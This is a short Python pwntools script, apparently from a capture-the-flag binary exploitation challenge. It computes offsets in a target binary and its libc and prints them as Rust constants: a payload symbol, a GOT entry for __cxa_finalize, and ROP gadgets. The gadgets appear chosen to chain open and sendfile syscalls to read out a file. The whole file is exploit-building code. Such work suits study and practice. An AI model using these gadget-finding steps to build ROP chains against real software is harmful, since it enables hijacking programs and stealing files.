from pwn import *


context.binary = "./runtime"
elf = context.binary
elf.address = 0

libc = ELF("./libc.so.6")
libc.address = 0
libc_symbol_in_got = "__cxa_finalize"

print(f"const PAYLOAD_FROM_BASE: usize = {hex(next(elf.symbols[symbol] for symbol in elf.symbols if symbol.startswith('_ZN7payload7payload7payload17')))};")
print(f"const SYMBOL_GOT_FROM_BASE: usize = {hex(elf.got[libc_symbol_in_got])};")
print(f"const SYMBOL_FROM_LIBC: usize = {hex(libc.symbols[libc_symbol_in_got])};")

# gadgets
print(f"const MOV_R9_RSP_16_CALL_R13: usize = {hex(next(libc.search(asm('mov r9, qword ptr [rsp + 0x10] ; call r13'), executable=True)))};")
print(f"const ADD_RSP_0X28_RET: usize = {hex(next(libc.search(asm('add rsp, 0x28 ; ret'), executable=True)))};")
print(f"const POP_R13_RET: usize = {hex(next(libc.search(asm('pop r13 ; ret'), executable=True)))};")
print(f"const POP_RDI_RET: usize = {hex(next(libc.search(asm('pop rdi ; ret'), executable=True)))};")
print(f"const POP_RSI_RET: usize = {hex(next(libc.search(asm('pop rsi ; ret'), executable=True)))};")
print(f"const MOV_EAX_2_RET: usize = {hex(next(libc.search(asm('mov eax, 2 ; ret'), executable=True)))};")
print(f"const SYSCALL_RET: usize = {hex(next(libc.search(asm('syscall ; ret'), executable=True)))};")
print(f"const POP_RDX_RCX_RBX_RET: usize = {hex(next(libc.search(asm('pop rdx ; pop rcx ; pop rbx ; ret'), executable=True)))};")
print(f"const MOV_R10_RCX_MOV_EAX_0X28_SYSCALL: usize = {hex(next(libc.search(asm('mov r10, rcx ; mov eax, 0x28 ; syscall'), executable=True)))};")

